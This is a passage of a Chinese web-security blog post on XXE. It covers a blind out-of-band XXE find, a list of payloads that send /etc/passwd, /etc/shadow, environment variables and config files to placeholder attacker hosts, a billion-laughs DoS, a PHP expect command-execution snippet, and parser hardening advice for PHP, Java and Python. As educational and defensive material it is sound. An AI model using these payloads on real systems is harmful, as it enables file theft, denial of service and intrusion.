<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1522480960730.png!small" alt="利用BLIND OOB XXE漏洞获取文件系统访问权限的测试"></p>
<p>虽然这次的POST响应还是XML内容，但却与上一次不同，这种响应表面上看似像服务端对GET请求的响应，而且，这次的响应内容中包含的标签值不是上次的“TestRequestCalled”，而是“OK”。接着，我又发送了一个定义的JSON请求（content-type: application/json），来测试服务端的具体响应：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15224809851093.png!small" alt="利用BLIND OOB XXE漏洞获取文件系统访问权限的测试"></p>
<p>这一次，响应内容又是空的，和未指定任何内容类型的简单POST请求响应一样，由此，我推断该服务端能正常处理XML数据，这样一来，我想尝试利用BLIND XXE攻击方式来触发其漏洞。我通过在自己VPS上架设了一个dtd文件，然后利用外部实体引用途径来测试其XML解析机制，幸运的是，最终部署在我VPS上的这个外部dtd文件实体被成功解析引用，以下是其请求内容和最后的解析结果：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15224810055081.png!small" alt="利用BLIND OOB XXE漏洞获取文件系统访问权限的测试"></p>
<h3 id="xxe-ftp-server-rb脚本应用"><a href="#xxe-ftp-server-rb脚本应用" class="headerlink" title="xxe-ftp-server.rb脚本应用"></a>xxe-ftp-server.rb脚本应用</h3><p>由于该系统使用了java框架，而俄罗斯OnSec实验室曾针对Java程序的XXE-OOB攻击作出了<a target="_blank" rel="noopener" href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html">相关研究</a>，并给出相应的payload，以及一个通过ftp服务读取系统目录的漏洞利用脚本<a target="_blank" rel="noopener" href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">xxe-ftp-server.rb</a>，运行该脚本后，8088端口作为http服务端负责获取OOB攻击payload，而8077端口用于ftp连接服务，最终能成功读取到目标系统目录：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1522481053799.png!small" alt="利用BLIND OOB XXE漏洞获取文件系统访问权限的测试"></p>
<p>尽管最后该漏洞被确认为一个重复报，但我还是想把它分享出来，我自己也从中学到一些判断服务端应用的经验。</p>
<h3 id="一些有用的XXE-Payload"><a href="#一些有用的XXE-Payload" class="headerlink" title="一些有用的XXE Payload"></a>一些有用的XXE Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">Vanilla, used to verify outbound xxe or blind xxe</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY sp SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;sp;&lt;&#x2F;r&gt;</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">OoB extraction</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;ev.xml&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param1;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;exfil;&lt;&#x2F;r&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;?%data;&#39;&gt;&quot;&gt;</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">OoB variation of above (seems to work better against .NET)</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;ev.xml&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param1;</span><br><span class="line">%exfil;</span><br><span class="line">]&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http:&#x2F;&#x2F;x.x.x.x:443&#x2F;?%data;&#39;&gt;&quot;&gt;</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">OoB extraction</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ENTITY % data3 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow&quot;&gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http:&#x2F;&#x2F;EvilHost:port&#x2F;sp.dtd&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param3;</span><br><span class="line">%exfil;</span><br><span class="line">]&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % param3 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;ftp:&#x2F;&#x2F;Evilhost:port&#x2F;%data3;&#39;&gt;&quot;&gt;</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">OoB extra ERROR -- Java</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ENTITY % data3 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;ss5.dtd&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param3;</span><br><span class="line">%exfil;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&lt;&#x2F;r&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % param1 &#39;&lt;!ENTITY &amp;#x25; external SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;nothere&#x2F;%payload;&quot;&gt;&#39;&gt; %param1; %external;</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">OoB extra nice</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line"> &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line"> &lt;!ENTITY % stuff SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;customapp&#x2F;WEB-INF&#x2F;applicationContext.xml &quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;evil&#x2F;evil.xml&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;all;&lt;&#x2F;root&gt;</span><br><span class="line"> </span><br><span class="line">## External dtd: ##</span><br><span class="line"> </span><br><span class="line">&lt;!ENTITY all &quot;%start;%stuff;%end;&quot;&gt;</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">File-not-found exception based extraction</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [ </span><br><span class="line">  &lt;!ENTITY % one SYSTEM &quot;http:&#x2F;&#x2F;attacker.tld&#x2F;dtd-part&quot; &gt;</span><br><span class="line">  %one;</span><br><span class="line">  %two;</span><br><span class="line">  %four;</span><br><span class="line">]&gt;</span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % three SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % two &quot;&lt;!ENTITY % four SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;%three;&#39;&gt;&quot;&gt;</span><br><span class="line">-------------------------^ you might need to encode this % (depends on your target) as: &amp;#x25;</span><br><span class="line">--------------</span><br><span class="line">FTP</span><br><span class="line">--------------</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % asd SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:4444&#x2F;ext.dtd&quot;&gt;</span><br><span class="line">%asd;</span><br><span class="line">%c;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;rrr;&lt;&#x2F;a&gt;</span><br><span class="line">## External dtd ##</span><br><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;environ&quot;&gt;</span><br><span class="line">&lt;!ENTITY % c &quot;&lt;!ENTITY rrr SYSTEM &#39;ftp:&#x2F;&#x2F;x.x.x.x:2121&#x2F;%d;&#39;&gt;&quot;&gt;</span><br><span class="line">---------------------------</span><br><span class="line">Inside SOAP body</span><br><span class="line">---------------------------</span><br><span class="line">&lt;soap:Body&gt;&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;x.x.x.x:22&#x2F;&quot;&gt; %dtd;]&gt;&lt;xxx&#x2F;&gt;]]&gt;&lt;&#x2F;foo&gt;&lt;&#x2F;soap:Body&gt;</span><br><span class="line">---------------------------</span><br><span class="line">Untested - WAF Bypass</span><br><span class="line">---------------------------</span><br><span class="line">&lt;!DOCTYPE :. SYTEM &quot;http:&#x2F;&#x2F;&quot;</span><br><span class="line">&lt;!DOCTYPE :_-_: SYTEM &quot;http:&#x2F;&#x2F;&quot;</span><br><span class="line">&lt;!DOCTYPE &#123;0xdfbf&#125; SYSTEM &quot;http:&#x2F;&#x2F;&quot;</span><br></pre></td></tr></table></figure>
<h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">   &lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure>
<p>这个的原理就是递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。 </p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>php环境下，xml命令执行需要php装有expect扩展，但是该扩展默认没有安装，所以一般来说，比较难利用，这里就只给出代码了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$xml &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">  &lt;!ENTITY f SYSTEM &quot;except:&#x2F;&#x2F;ls&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;&#x2F;x&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data &#x3D; simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="0x04-防御XXE"><a href="#0x04-防御XXE" class="headerlink" title="0x04 防御XXE"></a>0x04 防御XXE</h1><p>使用开发语言提供的禁用外部实体的方法</p>
<p>PHP:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>
<p>JAVA:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure>
<p>Python:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure>
<p>过滤用户提交的XML数据</p>
<p>过滤关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p>
<p>不允许XML中含有自己定义的DTD</p>
<blockquote>
<p>REFERENCE：<a target="_blank" rel="noopener" href="http://ironxu.com/910">http://ironxu.com/910</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/175451.html%E3%80%81">https://www.freebuf.com/news/175451.html、</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/167087.html">https://www.freebuf.com/vuls/167087.html</a></p>
</blockquote>
</div><div class="article-licensing box"><div class="licensing-title"><p>XXE漏洞</p><p><a href="http://b0u4ne.gihub.io/2020/09/11/web渗透/XXE漏洞/">http://b0u4ne.gihub.io/2020/09/11/web渗透/XXE漏洞/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>B0urne</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2020-09-11</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2020-09-11</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="sharethis-inline-share-buttons"></div><script src="www.baidu.com" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/alipay.png" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/wechat.png" alt="微信"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/09/12/Programming/JSP-JAVABEAN-SERVLET-MVC%E6%A8%A1%E5%9E%8B/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">JSP+JAVABEAN+SERVLET(MVC模型)</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/09/09/web%E6%B8%97%E9%80%8F/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9E%E5%9E%8Bshell%E5%92%8C%E5%8F%8D%E5%B0%84%E5%9E%8Bshell/"><span class="level-item">基于python的直连型shell和反射型shell</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.png" alt="B0urne"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">B0urne</p><p class="is-size-6 is-block">渗透测试/WEB安全</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>BeiJing</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">79</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">21</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">37</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#0x00-XML"><span class="level-left"><span class="level-item">1</span><span class="level-item">0x00 XML</span></span></a></li><li><a class="level is-mobile" href="#0x02-DTD"><span class="level-left"><span class="level-item">2</span><span class="level-item">0x02 DTD</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#带有DTD的XML文档实例"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">带有DTD的XML文档实例</span></span></a></li><li><a class="level is-mobile" href="#DTD元素"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">DTD元素</span></span></a></li><li><a class="level is-mobile" href="#DTD-实体-重要"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">DTD-实体(重要)</span></span></a></li><li><a class="level is-mobile" href="#内部实体"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">内部实体</span></span></a></li><li><a class="level is-mobile" href="#外部实体"><span class="level-left"><span class="level-item">2.5</span><span class="level-item">外部实体</span></span></a></li><li><a class="level is-mobile" href="#参数实体-外部实体"><span class="level-left"><span class="level-item">2.6</span><span class="level-item">参数实体+外部实体</span></span></a></li></ul></li><li><a class="level is-mobile" href="#0x03攻击实例"><span class="level-left"><span class="level-item">3</span><span class="level-item">0x03攻击实例</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#读取任意文件"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">读取任意文件</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#例子1"><span class="level-left"><span class="level-item">3.1.1</span><span class="level-item">例子1</span></span></a></li><li><a class="level is-mobile" href="#例子二"><span class="level-left"><span class="level-item">3.1.2</span><span class="level-item">例子二</span></span></a></li></ul></li><li><a class="level is-mobile" href="#检测内网端口"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">检测内网端口</span></span></a></li><li><a class="level is-mobile" href="#Bind-XXE"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">Bind XXE</span></span></a></li><li><a class="level is-mobile" href="#拓：Bind-XXE实例"><span class="level-left"><span class="level-item">3.4</span><span class="level-item">拓：Bind XXE实例</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#漏洞分析"><span class="level-left"><span class="level-item">3.4.1</span><span class="level-item">漏洞分析</span></span></a></li><li><a class="level is-mobile" href="#xxe-ftp-server-rb脚本应用"><span class="level-left"><span class="level-item">3.4.2</span><span class="level-item">xxe-ftp-server.rb脚本应用</span></span></a></li><li><a class="level is-mobile" href="#一些有用的XXE-Payload"><span class="level-left"><span class="level-item">3.4.3</span><span class="level-item">一些有用的XXE Payload</span></span></a></li></ul></li><li><a class="level is-mobile" href="#DOS"><span class="level-left"><span class="level-item">3.5</span><span class="level-item">DOS</span></span></a></li><li><a class="level is-mobile" href="#命令执行"><span class="level-left"><span class="level-item">3.6</span><span class="level-item">命令执行</span></span></a></li></ul></li><li><a class="level is-mobile" href="#0x04-防御XXE"><span class="level-left"><span class="level-item">4</span><span class="level-item">0x04 防御XXE</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="http://www.ol4three.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">oldthree</span></span><span class="level-right"><span class="level-item tag">www.ol4three.com</span></span></a></li><li><a class="level is-mobile" href="http://blog.leanote.com/xcniao@foxmail.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">XCniao</span></span><span class="level-right"><span class="level-item tag">blog.leanote.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Android/"><span class="level-start"><span class="level-item">Android</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/Mac/"><span class="level-start"><span class="level-item">Mac</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/SQL%E6%B3%A8%E5%85%A5/"><span class="level-start"><span class="level-item">SQL注入</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/SpringBoot/"><span class="level-start"><span class="level-item">SpringBoot</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/XSS/"><span class="level-start"><span class="level-item">XSS</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/hexo/"><span class="level-start"><span class="level-item">hexo</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/linux/"><span class="level-start"><span class="level-item">linux</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/python/"><span class="level-start"><span class="level-item">python</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/web%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">web渗透</span></span><span class="level-end"><span class="level-item tag">20</span></span></a></li><li><a class="level is-mobile" href="/categories/windows/"><span class="level-start"><span class="level-item">windows</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F/"><span class="level-start"><span class="level-item">人生感悟</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%9B%E9%98%B6/"><span class="level-start"><span class="level-item">博客搭建进阶</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%8F%90%E6%9D%83/"><span class="level-start"><span 